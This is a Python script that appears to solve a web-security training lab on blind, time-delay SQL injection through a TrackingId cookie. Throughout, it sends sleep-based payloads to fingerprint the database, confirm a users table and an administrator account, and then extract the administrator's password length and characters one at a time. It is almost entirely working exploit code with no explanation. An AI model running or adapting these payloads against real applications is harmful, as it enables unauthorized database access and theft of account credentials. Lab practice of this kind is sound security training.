
# Blind SQL injection with time delays and information retrieval
# Vulnerability in TrackingId cookie

import requests
import urllib3
import urllib
import time
import sys
import string

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxy = {
    "http":"http://127.0.0.1:8080",
    "https":"http://127.0.0.1:8080"
}

url = 'https://0a9d00d704da34e7c00142bf004400ea.web-security-academy.net/'

# Getting Cookies
r = requests.get(url, verify=False)
cookies = r.cookies.get_dict()

time_delays = {
    "Oracle" : "dbms_pipe.receive_message(('a'),3)",
    "Microsoft" : "WAITFOR DELAY '0:0:3'",
    "PostgreSQL" : "SELECT pg_sleep(3)",
    "MySQL" : "SELECT SLEEP(3)"
}

print('[+] Fuzzing time delay...')
for db,sql in time_delays.items():
    
    payload = f"' || ({sql})-- -"
    payload = urllib.parse.quote(payload)

    mal_cookies = cookies.copy()
    mal_cookies['TrackingId'] = mal_cookies['TrackingId'] + payload 

    t1 = time.time()
    r = requests.get(url, cookies=mal_cookies, verify=False)
    t2 = time.time()
    diff = t2 - t1
    print(f"-> {db}: {int(diff)}s")


# Checking if users table exists or not
print('[+] Checking if users table exists or not...')
payload = "' || (SELECT CASE WHEN (1=1) THEN pg_sleep(3) ELSE pg_sleep(-1) END FROM users)-- -"
payload = urllib.parse.quote(payload)

mal_cookies = cookies.copy()
mal_cookies['TrackingId'] = mal_cookies['TrackingId'] + payload 

t1 = time.time()
r = requests.get(url, cookies=mal_cookies, verify=False)
t2 = time.time()
diff = t2 - t1

if int(diff) >= 3:
    print("-> Users table exists in database")
else:
    print("-> Users does not table exist in database")


## Checking if administrator user exists in table
print('[+] Checking if administrator user exists in table...')
payload = "' || (SELECT CASE WHEN (1=1) THEN pg_sleep(3) ELSE pg_sleep(-1) END FROM users WHERE username='administrator')-- -"
payload = urllib.parse.quote(payload)

mal_cookies = cookies.copy()
mal_cookies['TrackingId'] = mal_cookies['TrackingId'] + payload 

t1 = time.time()
r = requests.get(url, cookies=mal_cookies, verify=False)
t2 = time.time()
diff = t2 - t1

if int(diff) >= 3:
    print("-> Administrator user exists in table")
else:
    print("-> Administrator user does not exist in table")


# Finding password length of administrator user
print('[+] Finding password length of administrator user...')

pass_len = 0
for i in range(1, 100):
    payload = f"' || (SELECT CASE WHEN (1=1) THEN pg_sleep(3) ELSE pg_sleep(-1) END FROM users WHERE username='administrator' AND LENGTH(password)={i})-- -"
    payload = urllib.parse.quote(payload)

    mal_cookies = cookies.copy()
    mal_cookies['TrackingId'] = mal_cookies['TrackingId'] + payload 

    t1 = time.time()
    r = requests.get(url, cookies=mal_cookies, verify=False)
    t2 = time.time()
    diff = t2 - t1

    sys.stdout.write(f'\r{i}')
    sys.stdout.flush()
    if int(diff) >= 3:
        pass_len = i
        break


## Finding password of administrator user
print('\n[+] Finding password of administrator user...')

password = ''
chars = string.digits + string.ascii_letters
for i in range(1, pass_len+1):
    for c in chars:
        payload = f"' || (SELECT CASE WHEN (1=1) THEN pg_sleep(3) ELSE pg_sleep(-1) END FROM users WHERE username='administrator' AND SUBSTRING(password,{i},1)='{c}')--"
        payload = urllib.parse.quote(payload)

        mal_cookies = cookies.copy()
        mal_cookies['TrackingId'] = mal_cookies['TrackingId'] + payload 

        t1 = time.time()
        r = requests.get(url, cookies=mal_cookies, verify=False)
        t2 = time.time()
        diff = t2 - t1

        sys.stdout.write(f'\r{password}{c}')
        sys.stdout.flush()
        if int(diff) >= 3:
            password +=c
            break